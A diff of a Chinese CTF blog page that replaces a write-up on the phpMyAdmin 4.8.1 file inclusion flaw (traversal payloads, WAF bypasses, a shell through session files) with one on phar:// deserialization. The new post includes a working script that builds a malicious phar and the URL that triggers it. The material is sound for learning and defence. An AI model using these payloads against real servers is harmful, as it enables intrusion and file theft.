@@ -6,20 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>phpmyadmin4.8.1 任意文件包含漏洞 | Welcome to Tristan&#39;s Blog!</title>
+  <title>File_Upload_Phar | Welcome to Tristan&#39;s Blog!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞知识点1、phpmyadmin4.8.1 代码审计2、文件包含漏洞3、目录遍历漏洞4、利用文件包含漏洞拿shell HCTF-WarmUp最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。打开页面，得到源码： &lt;?php highlight_file(__FILE__); class emmm {">
+  <meta name="description" content="Phar:&#x2F;&#x2F;伪协议触发反序列化知识点1、PHP序列化与反序列化2、与PHP序列化有关的常见魔术方法3、Phar：&#x2F;&#x2F;伪协议触发反序列化漏洞 最近在做题时，发现很多知识点都与反序列化漏洞有关，所以想写这篇文章简单介绍一下，什么是反序列化漏洞，以及触发条件；最后本文的重点在于使用phar:&#x2F;&#x2F;伪协议结合文件上传漏洞，达到触发反序列化漏洞的条件，达成攻击者的效果； 什么是序列化与反序列化？首先，介绍一">
 <meta property="og:type" content="article">
-<meta property="og:title" content="phpmyadmin4.8.1 任意文件包含漏洞">
-<meta property="og:url" content="http://yoursite.com/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="File_Upload_Phar">
+<meta property="og:url" content="http://yoursite.com/2020/04/19/File-Upload-Phar/index.html">
 <meta property="og:site_name" content="Welcome to Tristan&#39;s Blog!">
-<meta property="og:description" content="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞知识点1、phpmyadmin4.8.1 代码审计2、文件包含漏洞3、目录遍历漏洞4、利用文件包含漏洞拿shell HCTF-WarmUp最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。打开页面，得到源码： &lt;?php highlight_file(__FILE__); class emmm {">
+<meta property="og:description" content="Phar:&#x2F;&#x2F;伪协议触发反序列化知识点1、PHP序列化与反序列化2、与PHP序列化有关的常见魔术方法3、Phar：&#x2F;&#x2F;伪协议触发反序列化漏洞 最近在做题时，发现很多知识点都与反序列化漏洞有关，所以想写这篇文章简单介绍一下，什么是反序列化漏洞，以及触发条件；最后本文的重点在于使用phar:&#x2F;&#x2F;伪协议结合文件上传漏洞，达到触发反序列化漏洞的条件，达成攻击者的效果； 什么是序列化与反序列化？首先，介绍一">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-04-11T07:18:28.000Z">
-<meta property="article:modified_time" content="2020-04-11T09:59:34.692Z">
+<meta property="og:image" content="http://yoursite.com/2020/04/19/images/31.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/04/19/images/33.jpg">
+<meta property="article:published_time" content="2020-04-19T10:04:57.000Z">
+<meta property="article:modified_time" content="2020-04-19T14:03:03.777Z">
 <meta property="article:author" content="Tristan">
-<meta property="article:tag" content="php代码审计，文件包含">
+<meta property="article:tag" content="Phar+PHP反序列化漏洞">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/19/images/31.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Welcome to Tristan&#39;s Blog!" type="application/atom+xml">
   
@@ -137,100 +140,149 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-phpmyadmin4-8-1-任意文件包含漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-File-Upload-Phar" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      phpmyadmin4.8.1 任意文件包含漏洞
+      File_Upload_Phar
     </h1>
   
 
         
-        <a href="/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2020-04-11T07:18:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-11</time>
+        <a href="/2020/04/19/File-Upload-Phar/" class="archive-article-date">
+  	<time datetime="2020-04-19T10:04:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞"><a href="#从一道CTF题学习phpmyadmin4-8-1任意文件包含漏洞" class="headerlink" title="从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞"></a>从一道CTF题学习phpmyadmin4.8.1任意文件包含漏洞</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、phpmyadmin4.8.1 代码审计<br>2、文件包含漏洞<br>3、目录遍历漏洞<br>4、利用文件包含漏洞拿shell</p>
-<h5 id="HCTF-WarmUp"><a href="#HCTF-WarmUp" class="headerlink" title="HCTF-WarmUp"></a>HCTF-WarmUp</h5><p>最近刷BUU，发现GWCTF和HCTF都考到了这个知识点，于是总结一下。<br>打开页面，得到源码：</p>
+        <h3 id="Phar-伪协议触发反序列化"><a href="#Phar-伪协议触发反序列化" class="headerlink" title="Phar://伪协议触发反序列化"></a>Phar://伪协议触发反序列化</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>1、PHP序列化与反序列化<br>2、与PHP序列化有关的常见魔术方法<br>3、Phar：//伪协议触发反序列化漏洞</p>
+<p>最近在做题时，发现很多知识点都与反序列化漏洞有关，所以想写这篇文章简单介绍一下，什么是反序列化漏洞，以及触发条件；最后本文的重点在于使用phar://伪协议结合文件上传漏洞，达到触发反序列化漏洞的条件，达成攻击者的效果；</p>
+<h4 id="什么是序列化与反序列化？"><a href="#什么是序列化与反序列化？" class="headerlink" title="什么是序列化与反序列化？"></a>什么是序列化与反序列化？</h4><p>首先，介绍一下什么是序列化与反序列化：php程序为了保存和转储对象，提供了序列化的方法，php序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法。反序列化则是将字符串还原为存储对象；<br>在PHP中，序列化函数为serialize,反序列化函数为unserialize；<br>举个例子：</p>
 <pre><code>&lt;?php
-highlight_file(__FILE__);
-class emmm
-{
-    public static function checkFile(&amp;$page)
-    {
-        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 
-        if (! isset($page) || !is_string($page)) {
-            echo &quot;you can&apos;t see it&quot;;
-            return false;
-        }
 
-        if (in_array($page, $whitelist)) {
-            return true;
-        }
+class Test{
 
-        $_page = mb_substr(
-            $page,
-            0,
-            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-        );         //将$page中?前面的部分截取出来赋值给$_page
-        if (in_array($_page, $whitelist)) {
-            return true;
-        }
+     public$a = &apos;ThisA&apos;;
 
-        $_page = urldecode($page);//因为浏览器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-        $_page = mb_substr(
-            $_page,
-            0,
-            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-        );
-        if (in_array($_page, $whitelist)) {
-            return true;
+     protected$b = &apos;ThisB&apos;;
+
+     private$c = &apos;ThisC&apos;;
+
+     publicfunction test1(){
+
+              return&apos;this is test1 &apos;;
+
+     }
+
+}
+
+$test = new Test();
+
+var_dump(serialize($test));
+
+?&gt;</code></pre><p>经过序列化之后的结果为：</p>
+<pre><code>string(84) &quot;O:4:&quot;Test&quot;:3:{s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;s:4:&quot;*b&quot;;s:5:&quot;ThisB&quot;;s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;}&quot; </code></pre><p>其中O代表的是对象（如果是A，则代表是数组），4表示该对象名称有4个字符；“Test”表示该对象的名称；:3表示该对象里有3个成员。接着是括号里面的。我们这个类的三个成员变量由于变量前的修饰不同，在序列化出来后显示的也不同。<br>因为第一个变量a是Public属性，所以序列化后为 s:1:”a”;s:5:”ThisA”;  从左往右看，第一个分号前表示对象属性为字符串a，属性长度为1；第二个分号前表示对象属性所对应的值为字符串“ThisA”，长度为5；<br>因为第二个变量b是protect属性，序列化后，对应属性变成*b,其实应该是%00*%00b<br>对于第三个变量c是private属性，序列化后，对应属性变成Testc，其实应该是%00类名%00c<br>从结果可以发现，序列化并不保存对象方法；因此反序列化还原为对象时，自然也不包括对象方法；</p>
+<h4 id="常见魔术方法"><a href="#常见魔术方法" class="headerlink" title="常见魔术方法"></a>常见魔术方法</h4><p>在了解完php序列化和反序列化的过程后，接下来介绍一下常见可能触发反序列化漏洞的魔术方法：</p>
+<pre><code>__wakeup() //使用unserialize时触发
+__sleep() //使用serialize时触发
+__destruct() //对象被销毁时触发
+__call() //在对象上下文中调用不可访问的方法时触发
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+__toString() //把类当作字符串使用时触发
+__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h4 id="Phar：-伪协议触发反序列化漏洞"><a href="#Phar：-伪协议触发反序列化漏洞" class="headerlink" title="Phar：//伪协议触发反序列化漏洞"></a>Phar：//伪协议触发反序列化漏洞</h4><p>这里用GXYCTF babysqliV3.0学习一下<br>打开页面，是一个登陆框，联想到题目…自然往sql注入那块想，结果这道题就是一个弱口令爆破成功登陆（admin,password)。成功登陆后，是个文件上传页面；在url栏里看见file参数，猜测会不会是文件包含</p>
+<pre><code>http://6bf445b2-2c3f-40df-aec0-ac06767171f4.node3.buuoj.cn/home.php?file=upload</code></pre><p>尝试后发现，file参数不为upload,flag就会强制加上.fxxkyou，尝试php://filter读源码；成功读取upload.php源码</p>
+<pre><code>&lt;?php</code></pre><p>error_reporting(0);<br>class Uploader{<br>    public $Filename;<br>    public $cmd;<br>    public $token;</p>
+<pre><code>function __construct(){
+    $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&apos;user&apos;]).&quot;/&quot;;
+    $ext = &quot;.txt&quot;;
+    @mkdir($sandbox, 0777, true);  //创建文件目录
+    if(isset($_GET[&apos;name&apos;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&apos;name&apos;])){
+        $this-&gt;Filename = $_GET[&apos;name&apos;];
+    }
+    else{
+        $this-&gt;Filename = $sandbox.$_SESSION[&apos;user&apos;].$ext;
+    }
+
+    $this-&gt;cmd = &quot;echo &apos;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&apos;;&quot;;
+    $this-&gt;token = $_SESSION[&apos;user&apos;];
+}
+
+function upload($file){
+    global $sandbox;
+    global $ext;
+
+    if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){  //文件名以字母、数字命名
+        $this-&gt;cmd = &quot;die(&apos;illegal filename!&apos;);&quot;;
+    }
+    else{
+        if($file[&apos;size&apos;] &gt; 1024){  //文件要小于1024
+            $this-&gt;cmd = &quot;die(&apos;you are too big (â²â½`ã)&apos;);&quot;;
         }
-        echo &quot;you can&apos;t see it&quot;;
-        return false;
+        else{
+            $this-&gt;cmd = &quot;move_uploaded_file(&apos;&quot;.$file[&apos;tmp_name&apos;].&quot;&apos;, &apos;&quot; . $this-&gt;Filename . &quot;&apos;);&quot;;//将文件上传到目录下
+        }
     }
 }
 
-if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
-    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])  ##是字符串
-    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])  ##上面checkfile返回为true
-) {
-    include $_REQUEST[&apos;file&apos;];
-    exit;
-} else {
-    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-}  
-?&gt;</code></pre><p>通过分析代码，要求：<br>（1）$_REQUEST[‘file’] 不能为空，<br>（2）$_REQUEST[‘file’]是字符串，<br>（3）并且checkFile返回为true，才能包含$_REQUEST[‘file’]<br>突破的要点应该就是checkFile()函数，接下来重点研究一下：<br>要使得checkFile()为True，总共有三条路径：</p>
-<pre><code>if (in_array($page, $whitelist)) {
-    return true;
-}</code></pre><p>直接将变量进入白名单检验，因为没有对$page进行任何处理，所以无法绕过；<br>再看第二条路径：</p>
-<pre><code>$_page = mb_substr(
-       $page,
-       0,
-       mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-   );         //将$page中?前面的部分截取出来赋值给$_page
-   if (in_array($_page, $whitelist)) {
-       return true;
-   }</code></pre><p>mb_substr()是以0为起始位置，第三参数值为长度，切割$page变量，将其赋给$_page；<br>既然是以“?”为分割点，可不可以提前构造“?”使得切割部分可控呢？<br>又因为source.php在白名单列表中，构造payload:</p>
-<pre><code>index.php?source.php?/../../../../../ffflllaaaggg</code></pre><p>但不可行，原因在于；当传入这样的payload后，$page=source.php?/../../../../../ffflllaaaggg,经过mb_substr()分割后的$_page=source.php成功绕过白名单检测；<br>但在文件包含时，实际包含的内容是”include(source.php?../../../../../ffflllaaaggg)”,服务器会将?后的内容当作参数处理，因此无法实现文件包含；第二条路径走不通；<br>看最后一条路：</p>
-<pre><code>$_page = urldecode($page);//因为服务器会自动进行一次URL解码，所以若是经过二次编码，则在该处进行第二次URL解码
-    $_page = mb_substr(
-        $_page,
-        0,
-        mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-    );
-    if (in_array($_page, $whitelist)) {
-        return true;
-    }</code></pre><p>发现多了一个urldecode()函数；这时可以利用这个函数，在浏览器传入双重url编码的”?”,%253f;因为服务器会自动进行一次url解码，所以此时$page=source.php%3f/../../../../ffflllaaaggg;再经过urldecode()解码后成功绕过白名单；<br>此时文件包含的内容是include(source.php%3f/../../../../../ffflllaaaggg)<br>成功包含目标文件，得到flag；<br>而phpmyadmin4.8.1文件包含漏洞原理与上面分析基本一样；</p>
-<h3 id="利用该漏洞拿shell"><a href="#利用该漏洞拿shell" class="headerlink" title="利用该漏洞拿shell"></a>利用该漏洞拿shell</h3><p>既然该漏洞可以任意包含文件，是不是可以通过对某些文件添加一句话木马，然后调用该文件实现拿shell；这里直接引用某位师傅的博客：<a href="https://www.cnblogs.com/bmjoker/p/9897436.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9897436.html</a> (这次直接使用的BUU上的题目环境，没有本地搭建；导致文件修改后的路径找不到，无法利用shell，下次本地搭建后，再来填坑)<br>填坑：session_id路径应为：/var/lib/php/sessions/sess_id 即可成功拿shell</p>
-<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>对于小白来说可能并不理解../../../../的作用；<br>许多的Web应用程序一般会有对服务器的文件读取查看的功能，大多会用到提交的参数来指明文件名形如：<a href="http://www.nuanyue.com/getfile=image.jgp" target="_blank" rel="noopener">http://www.nuanyue.com/getfile=image.jgp</a><br>当服务器处理传送过来的image.jpg文件名后，Web应用程序即会自动添加完整路径，形如“d://site/images/image.jpg”，将读取的内容返回给访问者。<br>由于文件名可以任意更改而服务器支持“~/”，“../”等特殊符号的目录回溯，从而使攻击者越权访问或者覆盖敏感数据，如网站的配置文件、系统的核心文件，这样的缺陷被命名为路径遍历漏洞。当我们传入../../../../时，其实就是起到往上一层父目录跳转的作用，最终到达根目录；<br>对于某些waf，可以使用以下方法绕过：<br>(1) 加密参数传递的数据；<br>在Web应用程序对文件名进行加密之后再提交，比如：“downfile.jsp?filename= ZmFuLnBkZg- “，在参数filename用的是Base64加密，而攻击者要想绕过，只需简单的将文件名加密后再附加提交即可。所以说，采用一些有规律或者轻易能识别的加密方式，也是存在风险的。<br>(2) 编码绕过，<br>尝试使用不同的编码转换进行过滤性的绕过，比如Url编码，通过对参数进行Url编码提交，“downfile.jsp?filename= %66%61%6E%2E%70%64%66“来绕过。<br>(3) 目录限定绕过；<br>在有些Web应用程序是通过限定目录权限来分离的。当然这样的方法不值得可取的，攻击者可以通过某些特殊的符号”~“来绕过。形如这样的提交“downfile.jsp?filename=~/../boot”。能过这样一个符号，就可以直接跳转到硬盘目录下了。<br>(4) 绕过文件后缀过滤；<br>一些Web应用程序在读取文件前，会对提交的文件后缀进行检测，攻击者可以在文件名后放一个空字节的编码，来绕过这样的文件类型的检查。<br>例如：../../../../boot.ini%00.jpg，Web应用程序使用的Api会允许字符串中包含空字符，当实际获取文件名时，则由系统的Api会直接截短，而解析为“../../../../boot.ini”。<br>在类Unix的系统中也可以使用Url编码的换行符，例如：../../../etc/passwd%0a.jpg如果文件系统在获取含有换行符的文件名，会截短为文件名。也可以尝试%20，例如: ../../../index.jsp%20</p>
+function __toString(){
+    global $sandbox;
+    global $ext;
+    // return $sandbox.$this-&gt;Filename.$ext;
+    return $this-&gt;Filename; phar://xxxxxx;
+}
+
+function __destruct(){
+    if($this-&gt;token != $_SESSION[&apos;user&apos;]){
+        $this-&gt;cmd = &quot;die(&apos;check token falied!&apos;);&quot;;
+    }
+    eval($this-&gt;cmd); //读取flag.php 命令执行处
+    }
+}
+
+if(isset($_FILES[&apos;file&apos;])) {
+    $uploader = new Uploader(); //调用__construct函数
+    $uploader-&gt;upload($_FILES[&quot;file&quot;]);
+    if(@file_get_contents($uploader)){
+        echo &quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; //调用___tostring()函数 返回Filename赋值给\$uploader
+        echo file_get_contents($uploader);//读取上传的文件，phar://触发反序列化漏洞的地方
+    }
+}</code></pre><p>看到<strong>construct,</strong>toString魔术方法，猜测可能是考察反序列化漏洞，但没有发现unserilize()；这时看到之前的上传页面，可能是考察phar://协议触发反序列化漏洞；<br>之所以联想到phar://是因为，phar文件在存储meta_data时，会以序列化后的结果进行储存。具体phar文件结构可参考：<a href="https://www.cnblogs.com/Byqiyou/p/10187672.html" target="_blank" rel="noopener">https://www.cnblogs.com/Byqiyou/p/10187672.html</a><br>当使用phar://伪协议读取Phar文件时，可以不经过Unserilize()对meta_data进行反序列化；</p>
+<p>利用Phar反序列漏洞有几个条件：<br>可以上传Phar文件（将序列化结果构造好后存储到phar文件中）<br>有可以利用的魔术方法<br>文件操作函数的参数可控（这样才可以使用Phar://伪协议读取phar文件，触发反序列化漏洞）<br>回到题目，先找文件操作函数，发现在最后有一个file_get_contents($uploader),因为$uploader被当作字符串处理，会调用<strong>toString函数，返回$Filename,而这个变量是用户可控变量name传入赋值的；所以可以考虑在name传入Phar://伪协议流<br>接下来得考虑怎么利用反序列化漏洞“搞点事情”，观察魔术方法，发现在</strong>destruct()中存在eval()命令执行，前提是token=session[user];再往上看</p>
+<pre><code>if(isset($_GET[&apos;name&apos;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&apos;name&apos;])){
+        $this-&gt;Filename = $_GET[&apos;name&apos;];
+    }
+    else{
+        $this-&gt;Filename = $sandbox.$_SESSION[&apos;user&apos;].$ext;
+    }</code></pre><p>因此只要正常上传一个文件，就可以获得session[user]的值；<br>现在我们整理一下条件：首先得上传一个phar文件，meta_data存储的是我们构造好的序列化内容；<br>1、token=session[user]  上传正常文件即可得到<br>2、cmd=“可以读flag的命令”   比如highlight_file(“/var/www/html/flag.php”)<br>3、Filename值在phar文件里不是很重要，所以无所谓；但是上传完phar文件后，得通过$_GET[name]控制Filename，进行phar://伪协议读取phar文件，触发反序列化漏洞；<br>整理完思路，开始动手；<br>先在本地构造phar文件，得注意将php.ini中的phar.readonly设置为off；</p>
+<pre><code>&lt;?php
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+}
+
+$o = new Uploader();
+$o-&gt;cmd = &apos;highlight_file(&quot;/var/www/html/flag.php&quot;);&apos;; 
+$o-&gt;Filename = &apos;test&apos;;
+$o-&gt;token = &apos;GXYf512a36ddaa1031a9a3173e66bfd314d&apos;; //$_SESSION[&apos;user&apos;] 
+$phar = new Phar(&quot;test.phar&quot;);//文件名后缀一定得是phar
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();</code></pre><p>?&gt;<br>先上传一个正常文件，拿session[user]的值：<br><img src="../images/31.jpg" alt="1"><br>这图是我后来补的，所以session[user]值与我phar文件里不一样；<br>上传成功后，我们可以看见，Phar文件里的确将我们的内容经过序列化后进行存储；<br><img src="../images/33.jpg" alt="2"><br>第一步上传phar文件结束了，接下来就是使用phar://伪协议读phar文件触发漏洞了；</p>
+<pre><code>6bf445b2-2c3f-40df-aec0-ac06767171f4.node3.buuoj.cn/home.php?file=upload&amp;name=phar:///var/www/html/uploads/1a572a17c77b0c40edfb0d241b822e8c/GXY34aaaab760077ac04eab9a74c8e16225.txt</code></pre><p>$name参数传给Filename，最后因为$upload被当作字符串，触发__toString(),使得file_get_contents(‘phar:///var/www/html/uploads/xxxx.txt’)触发反序列化；最后随便上传一个文件（得有文件传入，file_get_contents才能执行),拿到flag;</p>
+<p>简单小结一下这道题，主要就是两步：<br>1、上传phar文件（构造时得观察哪些魔术方法中的哪些变量可能造成危险，这道题就是__destruct()中cmd可进行命令执行）<br>2、观察代码有没有文件操作函数，一般文件操作函数都是可以使用伪协议流的，尤其关注文件操作函数中有可控参数！！！</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习了文件上传漏洞+文件包含漏洞+phar://伪协议的组合使用，触发反序列化漏洞，从而造成一些不可预料的危险；POP链的题，还是蛮能培养代码审计能力的…</p>
 
       
 
@@ -244,7 +296,7 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">php代码审计，文件包含</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Phar+PHP反序列化漏洞</a>
         		</li>
       		
 		</ul>
@@ -300,7 +352,7 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/11/phpmyadmin4-8-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/04/19/File-Upload-Phar/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -314,18 +366,9 @@ if (! empty($_REQUEST[&apos;file&apos;])  ##不能为空
   
 <nav id="article-nav">
   
-    <a href="/2020/04/11/Online-tool/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Online-tool
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/04/10/SSRF-me/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">SSRF_me</div>
+    <a href="/2020/04/18/Create-function/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Create_function</div>
       <i class="icon-circle-right"></i>
     </a>
   
